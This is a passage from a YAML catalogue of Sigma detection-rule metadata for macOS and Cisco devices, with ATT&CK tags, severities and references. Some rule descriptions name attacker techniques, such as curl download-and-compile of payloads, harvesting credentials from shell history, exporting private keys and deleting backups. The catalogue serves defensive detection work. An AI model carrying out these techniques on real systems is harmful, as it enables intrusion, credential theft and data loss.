    be a result of a potential web browser exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1189
  - T1203
  tags:
  - attack.initial-access
  - attack.execution
  - attack.t1189
  - attack.t1203
  - attack.t1059
  time_window: ''
  references:
  - https://fr.slideshare.net/codeblue_jp/cb19-recent-apt-attack-on-crypto-exchange-employees-by-heungsoo-kang
  - https://github.com/elastic/detection-rules/blob/4312d8c9583be524578a14fe6295c3370b9a9307/rules/macos/execution_initial_access_suspicious_browser_childproc.toml
  false_positives:
  - Legitimate browser install, update and recovery scripts
  notes: ''
- detection_id: 6e4dcdd1-e48b-42f7-b2d8-3b413fc58cb4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_susp_execution_macos_script_editor.yml
  name: Suspicious Execution via macOS Script Editor
  description: Detects when the macOS Script Editor utility spawns an unusual child
    process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059
  - T1059.002
  - T1204
  - T1204.001
  - T1553
  - T1566
  - T1566.002
  tags:
  - attack.t1566
  - attack.t1566.002
  - attack.initial-access
  - attack.t1059
  - attack.t1059.002
  - attack.t1204
  - attack.t1204.001
  - attack.execution
  - attack.persistence
  - attack.t1553
  - attack.defense-evasion
  time_window: ''
  references:
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-7f541fbc4a4a28a92970e8bf53effea5bd934604429112c920affb457f5b2685
  - https://wojciechregula.blog/post/macos-red-teaming-initial-access-via-applescript-url/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85de3a19-b675-4a51-bfc6-b11a5186c971
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_susp_find_execution.yml
  name: Potential Discovery Activity Using Find - MacOS
  description: Detects usage of "find" binary in a suspicious manner to perform discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/SaiSathvik1/Linux-Privilege-Escalation-Notes
  false_positives:
  - Unknown
  notes: ''
- detection_id: 508a9374-ad52-4789-b568-fc358def2c65
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_susp_histfile_operations.yml
  name: Suspicious History File Operations
  description: Detects commandline operations on shell history files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.003
  tags:
  - attack.credential-access
  - attack.t1552.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.003/T1552.003.md
  false_positives:
  - Legitimate administrative activity
  - Legitimate software, cleaning hist file
  notes: ''
- detection_id: 13db8d2e-7723-4c2c-93c1-a4d36994f7ef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_susp_in_memory_download_and_compile.yml
  name: Potential In-Memory Download And Compile Of Payloads
  description: Detects potential in-memory downloading and compiling of applets using
    curl and osacompile as seen used by XCSSET malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.007
  - T1105
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.t1059.007
  - attack.t1105
  time_window: ''
  references:
  - https://redcanary.com/blog/mac-application-bundles/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7ed2c9f7-c59d-4c82-a7e2-f859aa676099
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_susp_macos_firmware_activity.yml
  name: Suspicious MacOS Firmware Activity
  description: Detects when a user manipulates with Firmward Password on MacOS. NOTE
    - this command has been disabled on silicon-based apple computers.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://github.com/usnistgov/macos_security/blob/932a51f3e819dd3e02ebfcf3ef433cfffafbe28b/rules/os/os_firmware_password_require.yaml
  - https://www.manpagez.com/man/8/firmwarepasswd/
  - https://support.apple.com/guide/security/firmware-password-protection-sec28382c9ca/web
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 58800443-f9fc-4d55-ae0c-98a3966dfb97
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_susp_system_network_discovery.yml
  name: System Network Discovery - macOS
  description: Detects enumeration of local network configuration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  tags:
  - attack.discovery
  - attack.t1016
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1016/T1016.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: a753a6af-3126-426d-8bd0-26ebbcb92254
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_suspicious_applet_behaviour.yml
  name: Osacompile Execution By Potentially Suspicious Applet/Osascript
  description: Detects potential suspicious applet or osascript executing "osacompile".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.002
  tags:
  - attack.execution
  - attack.t1059.002
  time_window: ''
  references:
  - https://redcanary.com/blog/mac-application-bundles/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5de06a6f-673a-4fc0-8d48-bcfe3837b033
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_swvers_discovery.yml
  name: System Information Discovery Using sw_vers
  description: Detects the use of "sw_vers" for system information discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/d3fa64f63563fe958b75238742d1e473800cb5f49f5cb79d38d4aa3c93709026/behavior
  - https://www.virustotal.com/gui/file/03b71eaceadea05bc0eea5cddecaa05f245126d6b16cfcd0f3ba0442ac58dab3/behavior
  - https://ss64.com/osx/sw_vers.html
  false_positives:
  - Legitimate administrative activities
  notes: ''
- detection_id: 652c098d-dc11-4ba6-8566-c20e89042f2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_sysadminctl_add_user_to_admin_group.yml
  name: User Added To Admin Group Via Sysadminctl
  description: Detects attempts to create and add an account to the admin group via
    "sysadminctl"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.003
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.privilege-escalation
  - attack.t1078.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.md#atomic-test-3---create-local-account-with-admin-privileges-using-sysadminctl-utility---macos
  - https://ss64.com/osx/sysadminctl.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: d7329412-13bd-44ba-a072-3387f804a106
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_sysadminctl_enable_guest_account.yml
  name: Guest Account Enabled Via Sysadminctl
  description: Detects attempts to enable the guest account using the sysadminctl
    utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1078.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  - attack.t1078.001
  time_window: ''
  references:
  - https://ss64.com/osx/sysadminctl.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6ff08e55-ea53-4f27-94a1-eff92e6d9d5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_sysctl_discovery.yml
  name: System Information Discovery Via Sysctl - MacOS
  description: 'Detects the execution of "sysctl" with specific arguments that have
    been used by threat actors and malware. It provides system hardware information.

    This process is primarily used to detect and avoid virtualization and analysis
    environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  - T1497.001
  tags:
  - attack.defense-evasion
  - attack.t1497.001
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://www.loobins.io/binaries/sysctl/#
  - https://evasions.checkpoint.com/techniques/macos.html
  - https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
  - https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/
  - https://objective-see.org/blog/blog_0x1E.html
  - https://www.virustotal.com/gui/file/1c547a064494a35d6b5e6b459de183ab2720a22725e082bed6f6629211f7abc1/behavior
  - https://www.virustotal.com/gui/file/b4b1fc65f87b3dcfa35e2dbe8e0a34ad9d8a400bec332025c0a2e200671038aa/behavior
  false_positives:
  - Legitimate administrative activities
  notes: ''
- detection_id: 9a7a0393-2144-4626-9bf1-7c2f5a7321db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml
  name: System Network Connections Discovery - MacOs
  description: Detects usage of system utilities to discover system network connections
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1049
  tags:
  - attack.discovery
  - attack.t1049
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: 4809c683-059b-4935-879d-36835986f8cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_system_profiler_discovery.yml
  name: System Information Discovery Using System_Profiler
  description: 'Detects the execution of "system_profiler" with specific "Data Types"
    that have been seen being used by threat actors and malware. It provides system
    hardware and software configuration information.

    This process is primarily used for system information discovery. However, "system_profiler"
    can also be used to determine if virtualization software is being run for defense
    evasion purposes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  - T1497.001
  tags:
  - attack.discovery
  - attack.defense-evasion
  - attack.t1082
  - attack.t1497.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_za/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
  - https://www.sentinelone.com/wp-content/uploads/pdf-gen/1630910064/20-common-tools-techniques-used-by-macos-threat-actors-malware.pdf
  - https://ss64.com/mac/system_profiler.html
  - https://objective-see.org/blog/blog_0x62.html
  - https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
  - https://gist.github.com/nasbench/9a1ba4bc7094ea1b47bc42bf172961af
  false_positives:
  - Legitimate administrative activities
  notes: ''
- detection_id: 40b1fbe2-18ea-4ee7-be47-0294285811de
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_system_shutdown_reboot.yml
  name: System Shutdown/Reboot - MacOs
  description: Adversaries may shutdown/reboot systems to interrupt access to, or
    aid in the destruction of, those systems.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: informational
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1529
  tags:
  - attack.impact
  - attack.t1529
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1529/T1529.md
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: 09a910bf-f71f-4737-9c40-88880ba5913d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_tail_base64_decode_from_image.yml
  name: Potential Base64 Decoded From Images
  description: 'Detects the use of tail to extract bytes at an offset from an image
    and then decode the base64 value to create a new file with the decoded content.
    The detected execution is a bash one-liner.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/16bafdf741e7a13137c489f3c8db1334f171c7cb13b62617d691b0a64783cc48/behavior
  - https://www.virustotal.com/gui/file/483fafc64a2b84197e1ef6a3f51e443f84dc5742602e08b9e8ec6ad690b34ed0/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 452df256-da78-427a-866f-49fa04417d74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml
  name: Time Machine Backup Deletion Attempt Via Tmutil - MacOS
  description: 'Detects deletion attempts of MacOS Time Machine backups via the native
    backup utility "tmutil".

    An adversary may perform this action before launching a ransonware attack to prevent
    the victim from restoring their files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-12---disable-time-machine
  - https://www.loobins.io/binaries/tmutil/
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: 2c95fa8a-8b8d-4787-afce-7117ceb8e3da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml
  name: Time Machine Backup Disabled Via Tmutil - MacOS
  description: 'Detects disabling of Time Machine (Apple''s automated backup utility
    software) via the native macOS backup utility "tmutil".

    An attacker can use this to prevent backups from occurring.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-12---disable-time-machine
  - https://www.loobins.io/binaries/tmutil/
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: 9acf45ed-3a26-4062-bf08-56857613eb52
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml
  name: New File Exclusion Added To Time Machine Via Tmutil - MacOS
  description: 'Detects the addition of a new file or path exclusion to MacOS Time
    Machine via the "tmutil" utility.

    An adversary could exclude a path from Time Machine backups to prevent certain
    files from being backed up.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-12---disable-time-machine
  - https://www.loobins.io/binaries/tmutil/
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: f68c4a4f-19ef-4817-952c-50dce331f4b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_wizardupdate_malware_infection.yml
  name: Potential WizardUpdate Malware Infection
  description: Detects the execution traces of the WizardUpdate malware. WizardUpdate
    is a macOS trojan that attempts to infiltrate macOS machines to steal data and
    it is associated with other types of malicious payloads, increasing the chances
    of multiple infections on a device.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-c68a1fcbf7a3f80c87225d7fdc031f691e9f3b6a14a36754be00762bfe6eae97
  - https://malpedia.caad.fkie.fraunhofer.de/details/osx.xcsset
  - https://www.microsoft.com/security/blog/2022/02/02/the-evolution-of-a-mac-trojan-updateagents-progression/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f5141b6d-9f42-41c6-a7bf-2a780678b29b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml
  name: Gatekeeper Bypass via Xattr
  description: Detects macOS Gatekeeper bypass via xattr utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553.001
  tags:
  - attack.defense-evasion
  - attack.t1553.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/1fed40dc7e48f16ed44dcdd9c73b9222a70cca85/atomics/T1553.001/T1553.001.md
  - https://www.loobins.io/binaries/xattr/
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: 47d65ac0-c06f-4ba2-a2e3-d263139d0f51
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_xcsset_malware_infection.yml
  name: Potential XCSSET Malware Infection
  description: Identifies the execution traces of the XCSSET malware. XCSSET is a
    macOS trojan that primarily spreads via Xcode projects and maliciously modifies
    applications. Infected users are also vulnerable to having their credentials,
    accounts, and other vital data stolen.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-f5deb07688e1a8dec9530bc3071967b2da5c16b482e671812b864c37beb28f08
  - https://malpedia.caad.fkie.fraunhofer.de/details/osx.xcsset
  false_positives:
  - Unknown
  notes: ''
- detection_id: ceb407f6-8277-439b-951f-e4210e3ed956
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_clear_logs.yml
  name: Cisco Clear Logs
  description: Clear command history in network OS which is used for defense evasion
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus5000/sw/command/reference/sysmgmt/n5k-sysmgmt-cr/n5k-sm_cmds_c.html
  - https://www.cisco.com/c/en/us/td/docs/ios/12_2sr/12_2sra/feature/guide/srmgtint.html#wp1127609
  false_positives:
  - Legitimate administrators may run these commands
  notes: ''
- detection_id: cd072b25-a418-4f98-8ebc-5093fb38fe1a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_collect_data.yml
  name: Cisco Collect Data
  description: Collect pertinent data from the configuration files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Discovery
  techniques:
  - T1005
  - T1087.001
  - T1552.001
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.collection
  - attack.t1087.001
  - attack.t1552.001
  - attack.t1005
  time_window: ''
  references:
  - https://blog.router-switch.com/2013/11/show-running-config/
  - https://www.cisco.com/E-Learning/bulk/public/tac/cim/cib/using_cisco_ios_software/cmdrefs/show_startup-config.htm
  - https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/config-mgmt/configuration/15-sy/config-mgmt-15-sy-book/cm-config-diff.html
  false_positives:
  - Commonly run by administrators
  notes: ''
- detection_id: 1f978c6a-4415-47fb-aca5-736a44d7ca3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_crypto_actions.yml
  name: Cisco Crypto Commands
  description: Show when private keys are being exported from the device, or when
    new certificates are installed
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1552.004
  - T1553.004
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.t1553.004
  - attack.t1552.004
  time_window: ''
  references:
  - https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/a1/sec-a1-cr-book/sec-a1-cr-book_chapter_0111.html
  false_positives:
  - Not commonly run by administrators. Also whitelist your known good certificates
  notes: ''
- detection_id: 9e8f6035-88bf-4a63-96b6-b17c0508257e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_disable_logging.yml
  name: Cisco Disabling Logging
  description: Turn off logging locally or remote
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.cisco.com/en/US/docs/ios/security/command/reference/sec_a2.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9705a6a1-6db6-4a16-a987-15b7151e299b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_discovery.yml
  name: Cisco Discovery
  description: Find information about network devices that is not stored in config
    files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  - T1018
  - T1033
  - T1049
  - T1057
  - T1082
  - T1083
  - T1124
  - T1201
  tags:
  - attack.discovery
  - attack.t1083
  - attack.t1201
  - attack.t1057
  - attack.t1018
  - attack.t1082
  - attack.t1016
  - attack.t1049
  - attack.t1033
  - attack.t1124
  time_window: ''
  references:
  - https://www.cisco.com/c/en/us/td/docs/server_nw_virtual/2-5_release/command_reference/show.html
  false_positives:
  - Commonly used by administrators for troubleshooting
  notes: ''
- detection_id: d94a35f0-7a29-45f6-90a0-80df6159967c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_dos.yml
  name: Cisco Denial of Service
  description: Detect a system being shutdown or put into different boot mode
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1495
  - T1529
  - T1565.001
  tags:
  - attack.impact
  - attack.t1495
  - attack.t1529
  - attack.t1565.001
  time_window: ''
  references: []
  false_positives:
  - Legitimate administrators may run these commands, though rarely.
  notes: ''
- detection_id: 71d65515-c436-43c0-841b-236b1f32c21e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_file_deletion.yml
  name: Cisco File Deletion
  description: See what files are being deleted from flash file systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1070.004
  - T1561.001
  - T1561.002
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1070.004
  - attack.t1561.001
  - attack.t1561.002
  time_window: ''
  references: []
  false_positives:
  - Will be used sometimes by admins to clean up local flash space
  notes: ''
- detection_id: b094d9fb-b1ad-4650-9f1a-fb7be9f1d34b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_input_capture.yml
  name: Cisco Show Commands Input
  description: See what commands are being input into the device by other people,
    full credentials can be in the history
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1552.003
  tags:
  - attack.credential-access
  - attack.t1552.003
  time_window: ''
  references: []
  false_positives:
  - Not commonly run by administrators, especially if remote logging is configured
  notes: ''
- detection_id: 6d844f0f-1c18-41af-8f19-33e7654edfc3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_local_accounts.yml
  name: Cisco Local Accounts
  description: Find local accounts being created or modified as well as remote authentication
    configurations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  - T1136.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1136.001
  - attack.t1098
  time_window: ''
  references: []
  false_positives:
  - When remote authentication is in place, this should not change often
  notes: ''
- detection_id: 671ffc77-50a7-464f-9e3d-9ea2b493b26b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_modify_config.yml
  name: Cisco Modify Configuration
  description: Modifications to a config that will serve an adversary's impacts or
    persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Impact
  - Persistence
  techniques:
  - T1053
  - T1490
  - T1505
  - T1565.002
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.impact
  - attack.t1490
  - attack.t1505
  - attack.t1565.002
  - attack.t1053
  time_window: ''
  references: []
  false_positives:
  - Legitimate administrators may run these commands
  notes: ''
- detection_id: 5e51acb2-bcbe-435b-99c6-0e3cd5e2aa59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/cisco/aaa/cisco_cli_moving_data.yml
  name: Cisco Stage Data
  description: Various protocols maybe used to put data on the device for exfil or
    infil
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: cisco
  product: aaa
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
